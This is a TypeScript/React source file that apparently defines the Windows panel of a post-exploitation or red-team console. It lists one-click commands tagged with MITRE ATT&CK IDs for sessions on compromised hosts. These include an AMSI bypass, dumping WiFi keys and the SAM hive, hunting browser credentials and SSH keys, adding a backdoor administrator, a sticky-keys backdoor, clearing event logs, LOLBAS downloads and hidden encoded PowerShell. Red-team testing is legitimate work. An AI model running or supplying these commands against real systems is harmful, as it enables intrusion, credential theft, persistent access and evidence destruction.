import OSPanel from './OSPanel'
import type { OSConfig, Category } from './OSPanel'
import type { Session } from '../types'

const MODULES: Category[] = [
  {
    id: 'recon', icon: '🔍', label: 'RECON', atkId: 'TA0007',
    cmds: [
      { icon: '👤', label: 'whoami /all',         cmd: 'whoami /all',                                        tag: 'T1033' },
      { icon: '💻', label: 'systeminfo',           cmd: 'systeminfo',                                         tag: 'T1082' },
      { icon: '🔧', label: 'OS / Patches',         cmd: 'wmic os get Caption,Version,BuildNumber /value && wmic qfe list brief', tag: 'T1082' },
      { icon: '👥', label: 'Local Users',          cmd: 'net user',                                           tag: 'T1087' },
      { icon: '🔑', label: 'Admins',               cmd: 'net localgroup administrators',                      tag: 'T1069' },
      { icon: '📋', label: 'Processes',            cmd: 'tasklist /v',                                        tag: 'T1057' },
      { icon: '⚙️', label: 'Running Services',     cmd: 'sc query type= all state= running',                  tag: 'T1007' },
      { icon: '📦', label: 'Installed Software',   cmd: 'wmic product get Name,Version /format:csv',         tag: 'T1518' },
      { icon: '🔒', label: 'AV / EDR',             cmd: 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /value', tag: 'T1518' },
      { icon: '🔌', label: 'Autorun Keys',         cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', tag: 'T1547' },
      { icon: '🕐', label: 'Scheduled Tasks',      cmd: 'schtasks /query /fo list /v',                        tag: 'T1053' },
      { icon: '📝', label: 'Event Log (Security)', cmd: 'wevtutil qe Security /c:10 /f:text /rd:true',       tag: 'T1005' },
    ],
  },
  {
    id: 'privesc', icon: '⬆️', label: 'PRIV ESC', atkId: 'TA0004',
    cmds: [
      { icon: '🎭', label: 'Privileges',            cmd: 'whoami /priv',                                       tag: 'T1134' },
      { icon: '🔑', label: 'Token / Groups',        cmd: 'whoami /groups /fo list',                            tag: 'T1134' },
      { icon: '📂', label: 'Unquoted Svc Paths',    cmd: 'wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "\\"', tag: 'T1574' },
      { icon: '🔧', label: 'AlwaysInstallElev',     cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul', tag: 'T1548' },
      { icon: '🛡️', label: 'UAC Level',            cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA', tag: 'T1548' },
      { icon: '🔐', label: 'PS Execution Policy',   cmd: 'powershell -c "Get-ExecutionPolicy -List"',          tag: 'T1059' },
      { icon: '💉', label: 'AMSI Bypass (test)',    cmd: 'powershell -c "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true); Write-Output amsi-bypassed"', tag: 'T1562' },
      { icon: '🎪', label: 'SeImpersonate (Potato)', cmd: 'whoami /priv | findstr SeImpersonatePrivilege',     tag: 'T1134' },
      { icon: '📁', label: 'Writable Svc Dirs',     cmd: 'for /f "tokens=2 delims==" %a in (\'wmic service get pathname /value ^| findstr PathName\') do @icacls "%a" 2>nul | findstr /i "everyone\\|users\\|authenticated" && echo WRITABLE: %a', tag: 'T1574' },
    ],
  },
  {
    id: 'creds', icon: '🔑', label: 'CREDENTIALS', atkId: 'TA0006',
    cmds: [
      { icon: '📋', label: 'Stored Creds (cmdkey)', cmd: 'cmdkey /list',                                       tag: 'T1552' },
      { icon: '📎', label: 'Clipboard',             cmd: 'powershell -c "Get-Clipboard"',                     tag: 'T1115' },
      { icon: '🌐', label: 'WiFi Passwords',        cmd: 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @if "%j" NEQ "" (echo Profile: %j & netsh wlan show profile "%j" key=clear | findstr "Key Content")', tag: 'T1552' },
      { icon: '🦊', label: 'Firefox Profiles',      cmd: 'dir /s /b C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*logins.json 2>nul', tag: 'T1555' },
      { icon: '🌐', label: 'Chrome Login Data',     cmd: 'dir /s /b C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\*Login Data 2>nul', tag: 'T1555' },
      { icon: '🔑', label: 'DPAPI Blobs',           cmd: 'dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul', tag: 'T1555' },
      { icon: '📋', label: 'PowerShell History',    cmd: 'type C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul', tag: 'T1552' },
      { icon: '💀', label: 'SAM Hive (needs SYS)',  cmd: 'reg save HKLM\\SAM C:\\Windows\\Temp\\SAM.hive /y 2>nul && echo saved || echo needs-SYSTEM', tag: 'T1003' },
      { icon: '🕵️', label: 'LSASS PID',            cmd: 'tasklist | findstr lsass',                           tag: 'T1003' },
    ],
  },
  {
    id: 'network', icon: '🌐', label: 'NETWORK', atkId: 'TA0007',
    cmds: [
      { icon: '🌐', label: 'IP Config',             cmd: 'ipconfig /all',                                      tag: 'T1016' },
      { icon: '🗺️', label: 'ARP Table',            cmd: 'arp -a',                                             tag: 'T1016' },
      { icon: '🔌', label: 'Open Ports',            cmd: 'netstat -ano',                                       tag: 'T1049' },
      { icon: '🛤️', label: 'Routes',               cmd: 'route print',                                        tag: 'T1016' },
      { icon: '🌍', label: 'DNS Cache',             cmd: 'ipconfig /displaydns',                               tag: 'T1016' },
      { icon: '📁', label: 'SMB Shares',            cmd: 'net share && net view /all 2>nul',                   tag: 'T1135' },
      { icon: '🔥', label: 'Firewall Rules',        cmd: 'netsh advfirewall firewall show rule name=all',      tag: 'T1562' },
      { icon: '🏠', label: 'Hosts File',            cmd: 'type C:\\Windows\\System32\\drivers\\etc\\hosts',    tag: 'T1016' },
    ],
  },
  {
    id: 'persist', icon: '🔒', label: 'PERSISTENCE', atkId: 'TA0003',
    cmds: [
      { icon: '📝', label: 'Run Keys',              cmd: 'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', tag: 'T1547' },
      { icon: '🕐', label: 'Sched Tasks',           cmd: 'schtasks /query /fo list /v | findstr "Task Name:\\|Status:\\|Run As"', tag: 'T1053' },
      { icon: '⚙️', label: 'New Sched Task',        cmd: 'schtasks /create /tn "WindowsUpdater" /tr "C:\\Windows\\Temp\\update.exe" /sc onlogon /ru System /f 2>nul && echo created', tag: 'T1053' },
      { icon: '👤', label: 'Add Backdoor User',     cmd: 'net user backd00r P@ssw0rd123! /add && net localgroup administrators backd00r /add',  tag: 'T1136' },
      { icon: '🔑', label: 'Sticky Keys Backdoor',  cmd: 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f', tag: 'T1546' },
      { icon: '🗑️', label: 'Clear Event Logs',     cmd: 'wevtutil cl System & wevtutil cl Security & wevtutil cl Application & echo cleared', tag: 'T1070' },
    ],
  },
  {
    id: 'ad', icon: '🏰', label: 'ACTIVE DIRECTORY', atkId: 'TA0006',
    cmds: [
      { icon: '🏰', label: 'Domain Info',           cmd: 'nltest /domain_trusts 2>nul && net view /domain 2>nul', tag: 'T1482' },
      { icon: '👑', label: 'Domain Admins',         cmd: 'net group "Domain Admins" /domain 2>nul',           tag: 'T1069' },
      { icon: '🖥️', label: 'Domain Controllers',   cmd: 'nltest /dclist: 2>nul',                             tag: 'T1018' },
      { icon: '🎫', label: 'Kerberoast SPNs',       cmd: 'powershell -c "setspn -Q */*"',                     tag: 'T1558' },
      { icon: '🔓', label: 'AS-REP Roastable',      cmd: 'powershell -c "([adsisearcher]\'(userAccountControl:1.2.840.113556.1.4.803:=4194304)\').FindAll().Properties.samaccountname"', tag: 'T1558' },
      { icon: '📋', label: 'GPO Result',            cmd: 'gpresult /R 2>nul',                                 tag: 'T1615' },
      { icon: '🗂️', label: 'ADCS Certs',           cmd: 'certutil -CAInfo 2>nul',                            tag: 'T1649' },
    ],
  },
  {
    id: 'lateral', icon: '↔️', label: 'LATERAL MOVE', atkId: 'TA0008',
    cmds: [
      { icon: '🔑', label: 'Cached Credentials',    cmd: 'cmdkey /list && net use',                                                     tag: 'T1021' },
      { icon: '🌐', label: 'Find SMB Hosts',        cmd: 'for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i 2>nul | findstr TTL && net view \\\\192.168.1.%i /all 2>nul', tag: 'T1135' },
      { icon: '📡', label: 'WMI Exec (loopback)',   cmd: 'wmic /node:127.0.0.1 process call create "cmd.exe /c whoami > C:\\Windows\\Temp\\wmi.txt" && timeout 2 && type C:\\Windows\\Temp\\wmi.txt', tag: 'T1047' },
      { icon: '📋', label: 'PS Remote (loopback)',  cmd: 'powershell -c "Invoke-Command -ComputerName localhost -ScriptBlock { whoami; hostname }"', tag: 'T1021' },
      { icon: '🔗', label: 'Net Shares (all)',      cmd: 'net view /all && net use',                                                    tag: 'T1135' },
      { icon: '🖥️', label: 'RDP Sessions',         cmd: 'query user /server:127.0.0.1 2>nul; netstat -an | findstr :3389',             tag: 'T1021' },
      { icon: '📁', label: 'Map Admin Share',       cmd: 'net use \\\\127.0.0.1\\C$ /user:Administrator P@ssw0rd 2>nul && dir \\\\127.0.0.1\\C$', tag: 'T1021' },
      { icon: '🔑', label: 'Pass-the-Hash Check',  cmd: 'powershell -c "Get-WinEvent -LogName Security -MaxEvents 20 -FilterXPath \\"*[System[EventID=4624]]\\""', tag: 'T1550' },
    ],
  },
  {
    id: 'lolbas', icon: '🎭', label: 'LOLBAS', atkId: 'TA0005',
    cmds: [
      { icon: '📥', label: 'Certutil Download',     cmd: 'certutil -urlcache -split -f http://127.0.0.1/test.exe C:\\Windows\\Temp\\test.exe 2>nul && echo downloaded', tag: 'T1105' },
      { icon: '📤', label: 'BITSAdmin Download',    cmd: 'bitsadmin /transfer job /download /priority high http://127.0.0.1/test.exe C:\\Windows\\Temp\\test.exe 2>nul', tag: 'T1197' },
      { icon: '⚡', label: 'Regsvr32 COM Bypass',   cmd: 'regsvr32 /s /n /u /i:http://127.0.0.1/file.sct scrobj.dll 2>nul',           tag: 'T1218' },
      { icon: '📜', label: 'Mshta Execute',         cmd: 'mshta vbscript:Execute("msgbox chr(119)&chr(104)&chr(111)&chr(97)&chr(109)&chr(105)(window.close)")', tag: 'T1218' },
      { icon: '🔧', label: 'Rundll32 Exec',         cmd: 'rundll32 shell32.dll,Control_RunDLL',                                        tag: 'T1218' },
      { icon: '📋', label: 'InstallUtil Bypass',    cmd: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Temp\\test.exe 2>nul', tag: 'T1218' },
      { icon: '🌐', label: 'IEX (Fileless PS)',     cmd: 'powershell -nop -w hidden -enc SABpACAAJQBVAFMAZQByAFAAcgBvAGYAaQBsAGUA',    tag: 'T1059' },
      { icon: '💻', label: 'WScript Exec',          cmd: 'wscript //E:vbscript //B "C:\\Windows\\Temp\\test.vbs" 2>nul',               tag: 'T1059' },
    ],
  },
  {
    id: 'hunt', icon: '🎯', label: 'HUNT', atkId: 'TA0009',
    cmds: [
      { icon: '🔑', label: 'Hunt Passwords',        cmd: 'findstr /si "password" C:\\Users\\*.txt C:\\Users\\*.ini C:\\Users\\*.config 2>nul | head -20', tag: 'T1552' },
      { icon: '📄', label: 'Hunt Config Files',     cmd: 'dir /s /b C:\\inetpub C:\\xampp C:\\wamp 2>nul | findstr /i ".config .env web.config appsettings" | head -20', tag: 'T1005' },
      { icon: '🗝️', label: 'Hunt SSH Keys',        cmd: 'dir /s /b C:\\Users\\.ssh 2>nul; dir /s /b C:\\Users\\*id_rsa* 2>nul; dir /s /b C:\\Users\\*.pem 2>nul | head -20', tag: 'T1552' },
      { icon: '💾', label: 'Hunt Databases',        cmd: 'dir /s /b C:\\ 2>nul | findstr /i ".mdf .ldf .sqlite .db3 .accdb" | head -20', tag: 'T1005' },
      { icon: '📧', label: 'Hunt Emails/PST',       cmd: 'dir /s /b C:\\Users 2>nul | findstr /i ".pst .ost .msg" | head -15',         tag: 'T1114' },
      { icon: '🔐', label: 'Hunt KeePass Files',    cmd: 'dir /s /b C:\\ 2>nul | findstr /i ".kdbx .kdb" | head -10',                 tag: 'T1552' },
      { icon: '📡', label: 'Hunt VPN Configs',      cmd: 'dir /s /b C:\\ 2>nul | findstr /i ".ovpn .vpn .rdp .pcf" | head -15',       tag: 'T1552' },
      { icon: '🌐', label: 'Hunt Source Code',      cmd: 'dir /s /b C:\\Users C:\\Projects C:\\repos 2>nul | findstr /i ".git .svn Gemfile requirements.txt" | head -15', tag: 'T1005' },
    ],
  },
]

function joinWin(base: string, name: string) { return base.replace(/[/\\]+$/, '') + '\\' + name }
function parentWin(p: string) {
  const t = p.replace(/[/\\]+$/, '')
  const i = Math.max(t.lastIndexOf('\\'), t.lastIndexOf('/'))
  return i <= 2 ? t.slice(0, 3) : t.slice(0, i)
}

const CONFIG: OSConfig = {
  name:       'Windows',
  icon:       '🪟',
  prompt:     'C:\\>',
  filter:     (s: Session) => s.os?.toLowerCase().includes('windows'),
  modules:    MODULES,
  defaultFs:  'C:\\',
  joinPath:   joinWin,
  parentPath: parentWin,
  quickCmds: [
    { icon: '👤', label: 'whoami /all',   cmd: 'whoami /all' },
    { icon: '💻', label: 'systeminfo',    cmd: 'systeminfo' },
    { icon: '📋', label: 'Processes',     cmd: 'tasklist /v' },
    { icon: '🌐', label: 'IP Config',     cmd: 'ipconfig /all' },
    { icon: '🔑', label: 'Privileges',    cmd: 'whoami /priv' },
    { icon: '👥', label: 'Local Users',   cmd: 'net user' },
    { icon: '🔒', label: 'AV / EDR',      cmd: 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /value' },
    { icon: '📂', label: 'Dir C:\\Users', cmd: 'dir C:\\Users' },
  ],
}

interface Props { onOpenTerminal: (id: string, name?: string) => void }
export default function Windows({ onOpenTerminal }: Props) {
  return <OSPanel config={CONFIG} onOpenTerminal={onOpenTerminal} />
}
